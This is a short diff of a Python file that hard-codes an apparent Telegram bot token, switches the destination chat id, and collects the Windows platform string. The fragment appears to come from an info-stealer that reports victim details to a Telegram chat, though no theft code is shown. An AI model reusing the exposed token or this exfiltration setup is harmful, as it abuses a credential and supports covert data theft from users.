@@ -10,7 +10,7 @@ from base64 import b64decode
 import hmac,platform
 
 apibot1='6565607500:AAEedbamaI1-LF-8xc2B3lO-UYw7XgSEQjU'
-id1='-4092431495'
+id1='-1001981081958'
 
 
 windows_version = platform.platform()
